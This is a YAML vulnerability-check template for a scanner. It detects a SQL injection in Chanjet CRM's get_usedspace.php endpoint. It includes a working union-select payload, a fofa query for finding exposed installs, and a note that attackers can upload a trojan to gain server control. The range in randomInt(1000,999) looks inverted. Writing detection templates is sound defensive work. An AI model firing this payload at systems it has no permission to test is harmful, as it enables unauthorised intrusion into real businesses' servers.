id: yonyou-chanjet-crm-get-usedspace-sqli

info:
  name: 畅捷 CRM SQL注入
  author: daffainfo
  severity: high
  verified: true
  description: |-
    畅捷CRM是面向小企业全力打造的简单、实用的客户关系管理应用!畅捷CRM帮助企业用好自己的客户资源、管好商机跟进过程、引导好业务员跟单行为。畅捷CRM系统存在SQL注入和后台文件上传漏洞，攻击者可以通过上传木马执行任意命令，获取服务器管理权限。
    fofa: title="畅捷CRM"
  reference:
    - https://mp.weixin.qq.com/s/ZjjXqN1RDeOQIH9ueTPymQ
  tags: yonyou,chanjet,crm,sqli
  created: 2025/08/29
  requires: [chanjet]
  requires-mode: opportunistic

set:
  randNum: randomInt(1000,999)
rules:
  r0:
    request:
      method: GET
      path: /webservice/get_usedspace.php?site_id=-1%20and%201=2%20union%20all%20select%20(md5({{randNum}}))
    expression: response.status == 200 && response.body.bcontains(bytes(md5(string(randNum))))
expression: r0()
